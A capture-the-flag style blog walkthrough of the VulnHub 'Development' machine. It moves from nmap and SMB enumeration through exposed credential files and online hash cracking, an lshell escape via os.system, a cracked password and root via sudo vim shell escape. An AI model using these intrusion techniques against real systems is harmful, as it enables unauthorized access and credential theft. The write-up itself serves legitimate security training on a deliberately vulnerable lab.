---
layout: post
title: VulnHub Development Writeup
categories: VulnHub Machines
permalink: /vulnhub/development
---

Machine: [https://www.vulnhub.com/entry/digitalworldlocal-development,280/](https://www.vulnhub.com/entry/digitalworldlocal-development,280/)
Machine Author: [Donavan](https://www.vulnhub.com/author/donavan,601/)

## Nmap

```bash
Nmap 7.94SVN scan initiated Sat Jan 11 01:18:27 2025 as: /usr/lib/nmap/nmap -Pn -p- -A --min-rate 5000 -oN scan.txt 192.168.247.132
Nmap scan report for 192.168.247.132
Host is up (0.00052s latency).
Not shown: 65530 closed tcp ports (reset)
PORT     STATE SERVICE     VERSION
22/tcp   open  ssh         OpenSSH 7.6p1 Ubuntu 4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 79:07:2b:2c:2c:4e:14:0a:e7:b3:63:46:c6:b3:ad:16 (RSA)
|_  256 24:6b:85:e3:ab:90:5c:ec:d5:83:49:54:cd:98:31:95 (ED25519)
113/tcp  open  ident?
|_auth-owners: oident
139/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
|_auth-owners: root
445/tcp  open  netbios-ssn Samba smbd 4.7.6-Ubuntu (workgroup: WORKGROUP)
|_auth-owners: root
8080/tcp open  http-proxy  IIS 6.0
|_http-title: DEVELOPMENT PORTAL. NOT FOR OUTSIDERS OR HACKERS!
|_http-server-header: IIS 6.0
|_http-open-proxy: Proxy might be redirecting requests
| fingerprint-strings: 
|   GetRequest: 
|     HTTP/1.1 200 OK
|     Date: Sat, 11 Jan 2025 01:18:50 GMT
|     Server: IIS 6.0
|     Last-Modified: Wed, 26 Dec 2018 01:55:41 GMT
|     ETag: "230-57de32091ad69"
|     Accept-Ranges: bytes
|     Content-Length: 560
|     Vary: Accept-Encoding
|     Connection: close
|     Content-Type: text/html
|     <html>
|     <head><title>DEVELOPMENT PORTAL. NOT FOR OUTSIDERS OR HACKERS!</title>
|     </head>
|     <body>
|     <p>Welcome to the Development Page.</p>
|     <br/>
|     <p>There are many projects in this box. View some of these projects at html_pages.</p>
|     <br/>
|     <p>WARNING! We are experimenting a host-based intrusion detection system. Report all false positives to patrick@goodtech.com.sg.</p>
|     <br/>
|     <br/>
|     <br/>
|     <hr>
|     <i>Powered by IIS 6.0</i>
|     </body>
|     <!-- Searching for development secret page... where could it be? -->
|     <!-- Patrick, Head of Development-->
|     </html>
|   HTTPOptions: 
|     HTTP/1.1 200 OK
|     Date: Sat, 11 Jan 2025 01:18:50 GMT
|     Server: IIS 6.0
|     Allow: GET,POST,OPTIONS,HEAD
|     Content-Length: 0
|     Connection: close
|     Content-Type: text/html
|   RTSPRequest: 
|     HTTP/1.1 400 Bad Request
|     Date: Sat, 11 Jan 2025 01:18:50 GMT
|     Server: IIS 6.0
|     Content-Length: 294
|     Connection: close
|     Content-Type: text/html; charset=iso-8859-1
|     <!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">
|     <html><head>
|     <title>400 Bad Request</title>
|     </head><body>
|     <h1>Bad Request</h1>
|     <p>Your browser sent a request that this server could not understand.<br />
|     </p>
|     <hr>
|     <address>IIS 6.0 Server at 192.168.247.132 Port 8080</address>
|_    </body></html>
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port8080-TCP:V=7.94SVN%I=7%D=1/11%Time=6781C6FA%P=x86_64-pc-linux-gnu%r
SF:(GetRequest,330,"HTTP/1\.1\x20200\x20OK\r\nDate:\x20Sat,\x2011\x20Jan\x
SF:202025\x2001:18:50\x20GMT\r\nServer:\x20IIS\x206\.0\r\nLast-Modified:\x
SF:20Wed,\x2026\x20Dec\x202018\x2001:55:41\x20GMT\r\nETag:\x20\"230-57de32
SF:091ad69\"\r\nAccept-Ranges:\x20bytes\r\nContent-Length:\x20560\r\nVary:
SF:\x20Accept-Encoding\r\nConnection:\x20close\r\nContent-Type:\x20text/ht
SF:ml\r\n\r\n<html>\r\n<head><title>DEVELOPMENT\x20PORTAL\.\x20NOT\x20FOR\
SF:x20OUTSIDERS\x20OR\x20HACKERS!</title>\r\n</head>\r\n<body>\r\n<p>Welco
SF:me\x20to\x20the\x20Development\x20Page\.</p>\r\n<br/>\r\n<p>There\x20ar
SF:e\x20many\x20projects\x20in\x20this\x20box\.\x20View\x20some\x20of\x20t
SF:hese\x20projects\x20at\x20html_pages\.</p>\r\n<br/>\r\n<p>WARNING!\x20W
SF:e\x20are\x20experimenting\x20a\x20host-based\x20intrusion\x20detection\
SF:x20system\.\x20Report\x20all\x20false\x20positives\x20to\x20patrick@goo
SF:dtech\.com\.sg\.</p>\r\n<br/>\r\n<br/>\r\n<br/>\r\n<hr>\r\n<i>Powered\x
SF:20by\x20IIS\x206\.0</i>\r\n</body>\r\n\r\n<!--\x20Searching\x20for\x20d
SF:evelopment\x20secret\x20page\.\.\.\x20where\x20could\x20it\x20be\?\x20-
SF:->\r\n\r\n<!--\x20Patrick,\x20Head\x20of\x20Development-->\r\n\r\n</htm
SF:l>\r\n")%r(HTTPOptions,A6,"HTTP/1\.1\x20200\x20OK\r\nDate:\x20Sat,\x201
SF:1\x20Jan\x202025\x2001:18:50\x20GMT\r\nServer:\x20IIS\x206\.0\r\nAllow:
SF:\x20GET,POST,OPTIONS,HEAD\r\nContent-Length:\x200\r\nConnection:\x20clo
SF:se\r\nContent-Type:\x20text/html\r\n\r\n")%r(RTSPRequest,1CD,"HTTP/1\.1
SF:\x20400\x20Bad\x20Request\r\nDate:\x20Sat,\x2011\x20Jan\x202025\x2001:1
SF:8:50\x20GMT\r\nServer:\x20IIS\x206\.0\r\nContent-Length:\x20294\r\nConn
SF:ection:\x20close\r\nContent-Type:\x20text/html;\x20charset=iso-8859-1\r
SF:\n\r\n<!DOCTYPE\x20HTML\x20PUBLIC\x20\"-//IETF//DTD\x20HTML\x202\.0//EN
SF:\">\n<html><head>\n<title>400\x20Bad\x20Request</title>\n</head><body>\
SF:n<h1>Bad\x20Request</h1>\n<p>Your\x20browser\x20sent\x20a\x20request\x2
SF:0that\x20this\x20server\x20could\x20not\x20understand\.<br\x20/>\n</p>\
SF:n<hr>\n<address>IIS\x206\.0\x20Server\x20at\x20192\.168\.247\.132\x20Po
SF:rt\x208080</address>\n</body></html>\n");
MAC Address: 00:0C:29:62:1F:6D (VMware)
Device type: general purpose
Running: Linux 3.X|4.X
OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4
OS details: Linux 3.2 - 4.9
Network Distance: 1 hop
Service Info: Host: DEVELOPMENT; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled but not required
|_clock-skew: mean: -6s, deviation: 5s, median: -10s
| smb2-time: 
|   date: 2025-01-11T01:21:18
|_  start_date: N/A
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
|_nbstat: NetBIOS name: DEVELOPMENT, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
| smb-os-discovery: 
|   OS: Windows 6.1 (Samba 4.7.6-Ubuntu)
|   Computer name: development
|   NetBIOS computer name: DEVELOPMENT\x00
|   Domain name: \x00
|   FQDN: development
|_  System time: 2025-01-11T01:21:18+00:00

TRACEROUTE
HOP RTT     ADDRESS
1   0.51 ms 192.168.247.132

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Sat Jan 11 01:21:50 2025 -- 1 IP address (1 host up) scanned in 202.83 seconds
```

Alright so there a few ports open on the system. The ones we should be concerned about are smb and the webserver running under 8080. We can start by trying to list the smbshare.

```bash
smbclient -L \\192.168.247.132                                   
Password for [WORKGROUP\kali]:

        Sharename       Type      Comment
        ---------       ----      -------
        print$          Disk      Printer Drivers
        access          Disk      
        IPC$            IPC       IPC Service (development server (Samba, Ubuntu))
Reconnecting with SMB1 for workgroup listing.

        Server               Comment
        ---------            -------

        Workgroup            Master
        ---------            -------
        WORKGROUP            DEVELOPMENT
```

It seems there is a share called access, let’s see if we can access it without credentials.

```bash
smbclient \\\\192.168.247.132\\access
Password for [WORKGROUP\kali]:
tree connect failed: NT_STATUS_ACCESS_DENIED
```

Seems not. No worries though, we can go ahead and run enum4linux and see what it can find.

```bash
enum4linux 192.168.247.132  
Starting enum4linux v0.9.1 ( http://labs.portcullis.co.uk/application/enum4linux/ ) on Sat Jan 11 01:28:01 2025

 =========================================( Target Information )=========================================
                                                                                                                                                                                                                                            
Target ........... 192.168.247.132                                                                                                                                                                                                          
RID Range ........ 500-550,1000-1050
Username ......... ''
Password ......... ''
Known Usernames .. administrator, guest, krbtgt, domain admins, root, bin, none

                                                                                                                                                                                                                     
<SNIP>

 ======================================( Users on 192.168.247.132 )======================================
                                                                                                                                                                                                                                            
index: 0x1 RID: 0x3e8 acb: 0x00000010 Account: intern   Name:   Desc:                                                                                                                                                                       

user:[intern] rid:[0x3e8]

<SNIP>

 ==========================( Password Policy Information for 192.168.247.132 )==========================
                                                                                                                                                                                                                                            
                                                                                                                                                                                                                                            

[+] Attaching to 192.168.247.132 using a NULL share

[+] Trying protocol 139/SMB...

[+] Found domain(s):

        [+] DEVELOPMENT
        [+] Builtin

[+] Password Info for Domain: DEVELOPMENT

        [+] Minimum password length: 5
        [+] Password history length: None
        [+] Maximum password age: 37 days 6 hours 21 minutes 
        [+] Password Complexity Flags: 000000

                [+] Domain Refuse Password Change: 0
                [+] Domain Password Store Cleartext: 0
                [+] Domain Password Lockout Admins: 0
                [+] Domain Password No Clear Change: 0
                [+] Domain Password No Anon Change: 0
                [+] Domain Password Complex: 0

        [+] Minimum password age: None
        [+] Reset Account Lockout Counter: 30 minutes 
        [+] Locked Account Duration: 30 minutes 
        [+] Account Lockout Threshold: None
        [+] Forced Log off Time: 37 days 6 hours 21 minutes 

[+] Retieved partial password policy with rpcclient:                                                                                                                                                                                        
                                                                                                                                                                                                                                            
                                                                                                                                                                                                                                            
Password Complexity: Disabled                                                                                                                                                                                                               
Minimum Password Length: 5

<SNIP>
```

It wasn’t able to find much except for the user intern and the password policy. We can keep these in mind for later.

Now let’s go ahead and enumerate the http server. 

![1](https://github.com/user-attachments/assets/2c53f484-5327-4bc7-a048-d9abb61e1784)


We are greeted by this page. We can see a WARNING that a host-based intrustion detection system is being tested. So we should refrain from running any bruteforce attacks. We can also infer that patrick is a valid user. So we can add that our list of users for later use. The page says that there are many projects in this box and that they can be viewed at html_pages.

So let’s go ahead and visit the /html_pages endpoint.

![2](https://github.com/user-attachments/assets/487d334a-ec49-473a-889e-8e62dabc8276)


We can see a listing of a few different pages. After taking a look at a few interesting pages such as config.html and uploads.html. I found something under development.html

![3](https://github.com/user-attachments/assets/62304046-c3af-457a-b73f-45adf6a48929)


Looking at the source code for this page we can find the below comment.

```bash
<!-- You tried harder! Visit ./developmentsecretpage. -->
```

So let’s go ahead and visit /developmentsecretpage

![4](https://github.com/user-attachments/assets/6bdc3a64-7e94-4c0f-bb8a-84a6eafbbafa)


After looking at the source code there isn’t anything interesting except for that link. So let’s go ahead and visit that page.

![5](https://github.com/user-attachments/assets/e61dab1a-c3df-4533-88e5-cbf7af17d8b8)


There is another link to a sitemap page. Let’s go ahead and visit that.

![7](https://github.com/user-attachments/assets/212e8ff7-1071-4fad-a1e4-e5c72bdf5f63)


We can see a few more pages, let’s visit them as well.

![8](https://github.com/user-attachments/assets/d92a98e1-1f67-4aa9-aea7-d9dfc08f6de7)


This page gives us some interesting information. The page says that there are some developers using weak passwords such as password. And ‘permanent’ is bolded, which could signify that temporary staff are not targeted which could mean that our intern user could potentially have a weak password such as that. We’ll keep this in mind for later. For now let’s look at the other page

![9](https://github.com/user-attachments/assets/83b5d265-634e-4d3a-87cc-7bd06525be79)


This page is apparently used to provide updates to the director. Let’s look at the source code to see if we can find something there.

```bash
<!-- Director's comments: Does this not appear to be rather silly? I think we can make use of shoutbox. -->
<!-- Patrick's response: OK. When do you want it? -->
<!-- Director's comments: In three months' time. -->
<!-- Patrick's response: We have cleared test.html for testing purposes. We'll put up a warning for the rest to know it is not to be meddled. -->
<!-- Director's comments: Approved. -->
```

We are able to find these comments. This doesn’t really tell us much. I tried opening the test.html page to see if it was accessible but turns out it wasn’t.

There was only one link left to click which was ‘Click here to log out.’ So I tried that out and it took me to a login form.

![10](https://github.com/user-attachments/assets/259e17a7-f109-415d-a081-9a49c95512be)


Let’s try and input random data to see what happens.

![11](https://github.com/user-attachments/assets/f09fb712-66dd-44f8-8c80-5df06e191bc0)


We are directed back to the same page, but this time we can see some php errors.

```bash
Deprecated: Function ereg_replace() is deprecated in /var/www/html/developmentsecretpage/slogin_lib.inc.php on line 335

Deprecated: Function ereg_replace() is deprecated in /var/www/html/developmentsecretpage/slogin_lib.inc.php on line 336
```

I tried visiting the /slogin_lib.inc.php to see if there was anything interesting there but turns out there wasn’t. 

So I decided to Google the slogin_lib.inc.php to see if I could figure out what backend the login form was working from.

Turns out it belongs to the Simple Text-File Login Script which happens to store credentials in a .txt file /slog_users.txt

Let’s go ahead and visit that page to see if we can find any valid users.

![12](https://github.com/user-attachments/assets/d168243b-ac11-4aa1-b26d-dec66a4c7115)


There we go, we can see the patrick and intern users as we found earlier and two more users admin and qiu. Let’s go ahead and see if we can find a match for the hashes on crackstation.

![13](https://github.com/user-attachments/assets/6c9e4046-87f4-4c26-8158-3bd5b1d54341)


We were able to find matches for the intern user and qiu user. Let’s see if we can use the intern password to login via ssh.

```bash
ssh intern@192.168.247.132
intern@192.168.247.132's password: 
Welcome to Ubuntu 18.04.1 LTS (GNU/Linux 4.15.0-34-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Sat Jan 11 03:29:32 UTC 2025

  System load:  0.02               Processes:            169
  Usage of /:   28.6% of 19.56GB   Users logged in:      0
  Memory usage: 35%                IP address for ens33: 192.168.247.132
  Swap usage:   0%

 * Canonical Livepatch is available for installation.
   - Reduce system reboots and improve kernel security. Activate at:
     https://ubuntu.com/livepatch

32 packages can be updated.
0 updates are security updates.

Last login: Thu Aug 23 15:57:48 2018 from 192.168.254.228
Congratulations! You tried harder!
Welcome to Development!
Type '?' or 'help' to get the list of allowed commands
intern:~$ ?
cd  clear  echo  exit  help  ll  lpath  ls
intern:~$ echo $SHELL
/usr/local/bin/lshell
```

There we go we were able to get a shell, but it is quite limited since we can only use the above commands. We can try to escape out of this shell. Since the lshell is python based we could try to escape by calling the os library.

```bash
intern:~$ echo os.system("/bin/bash")
intern@development:~$ whoami
intern
intern@development:~$
```

There we go, we now have access to any command.

```bash
intern@development:~$ cat local.txt 
Congratulations on obtaining a user shell. :)
intern@development:~$ cat work.txt 
1.      Tell Patrick that shoutbox is not working. We need to revert to the old method to update David about shoutbox. For new, we will use the old director's landing page.

2.      Patrick's start of the third year in this company!

3.      Attend the meeting to discuss if password policy should be relooked at.
```

There isn’t much on the user’s directory so let’s perform some enumeration elsewhere. After spending some time enumerating using intern I was not able to find anything. So I decided to take a step back and review all the information I had gathered till now. I tried to look at the hashes obtained earlier and tried to see if any other website could find a match for the patrick and admin hashes. I was able to find this using md5online.org.

```bash
patrick:P@ssw0rd25
```

Let's go ahead and login.

```bash
intern@development:/tmp$ su patrick
Password: 
patrick@development:/tmp$ cd ~
patrick@development:~$ ls
access.txt  password.txt
patrick@development:~$
```

It seems we were able to switch to patrick’s account.

```bash
patrick@development:~$ sudo -l
Matching Defaults entries for patrick on development:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User patrick may run the following commands on development:
    (ALL) NOPASSWD: /usr/bin/vim
    (ALL) NOPASSWD: /bin/nano
```

Running sudo -l we find that we are able to run vim and nano as any user. We can use either of these to escalate our privileges. I will use vim since I’m most familiar with that.

```bash
patrick@development:~$ sudo /usr/bin/vim -c ':!/bin/bash'

root@development:~# id
uid=0(root) gid=0(root) groups=0(root)
```

Finally, we have root.

```bash
root@development:/root# cat proof.txt 
Congratulations on rooting DEVELOPMENT! :)
```

## Final Thoughts

This was an amazing machine for me personally. I learnt a lot from this machine. The fact that there was a “host-based intrusion detection system” made me rely on my manual enumerating skills which was a fun challenge. I also got to learn about restricted shells, since I haven’t really run into them much in machines except in the form of web sandboxes, so it was nice to learn something new from this box.
